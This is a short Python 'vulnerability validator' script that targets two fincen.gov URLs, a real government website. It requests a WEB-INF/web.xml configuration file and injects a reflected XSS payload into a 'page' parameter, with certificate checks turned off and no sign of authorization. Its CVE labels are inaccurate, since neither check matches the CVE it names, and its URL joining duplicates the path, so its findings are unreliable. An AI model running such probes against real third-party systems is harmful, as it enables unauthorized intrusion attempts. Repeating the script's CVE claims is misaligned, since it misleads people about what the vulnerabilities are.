import requests
import json
from urllib.parse import urljoin

# Disable warnings for unverified HTTPS requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def check_cve_2021_28164(url):
    """
    Checks if the URL is vulnerable to CVE-2021-28164.
    Explores access to sensitive configuration files like `web.xml`.
    """
    print(f"[+] Testing for CVE-2021-28164 on {url}")
    test_path = "WEB-INF/web.xml"
    vuln_url = urljoin(url, test_path)
    try:
        response = requests.get(vuln_url, verify=False, timeout=10)
        if response.status_code == 200 and "<web-app" in response.text:
            print(f"[-] Vulnerable! Sensitive file exposed at: {vuln_url}")
            return {"cve": "CVE-2021-28164", "url": vuln_url, "status": "vulnerable"}
        else:
            print(f"[+] Not vulnerable to CVE-2021-28164.")
            return {"cve": "CVE-2021-28164", "url": vuln_url, "status": "not vulnerable"}
    except Exception as e:
        print(f"[!] Error testing CVE-2021-28164: {e}")
        return {"cve": "CVE-2021-28164", "url": vuln_url, "status": "error", "error": str(e)}

def check_cve_2020_9490(url):
    """
    Checks if the URL is vulnerable to CVE-2020-9490.
    Explores deserialization or parameter injection risks.
    """
    print(f"[+] Testing for CVE-2020-9490 on {url}")
    test_param = {"page": "<script>alert('xss')</script>"}
    try:
        response = requests.get(url, params=test_param, verify=False, timeout=10)
        if "<script>alert('xss')</script>" in response.text:
            print(f"[-] Vulnerable! XSS payload reflected at: {url}")
            return {"cve": "CVE-2020-9490", "url": url, "status": "vulnerable"}
        else:
            print(f"[+] Not vulnerable to CVE-2020-9490.")
            return {"cve": "CVE-2020-9490", "url": url, "status": "not vulnerable"}
    except Exception as e:
        print(f"[!] Error testing CVE-2020-9490: {e}")
        return {"cve": "CVE-2020-9490", "url": url, "status": "error", "error": str(e)}

def main():
    print("### Vulnerability Validator ###")
    urls = [
        "https://www.fincen.gov/news-room/WEB-INF/web.xml?page",
        "https://www.fincen.gov/news-room?page"
    ]
    
    results = []

    for url in urls:
        if "WEB-INF" in url:
            results.append(check_cve_2021_28164(url))
        elif "page" in url:
            results.append(check_cve_2020_9490(url))

    # Save results to JSON
    with open("vulnerability_results.json", "w") as f:
        json.dump(results, f, indent=4)

    print("\n### Summary ###")
    for result in results:
        status = result.get("status", "unknown")
        print(f" - {result['cve']} on {result['url']} => {status}")

if __name__ == "__main__":
    main()
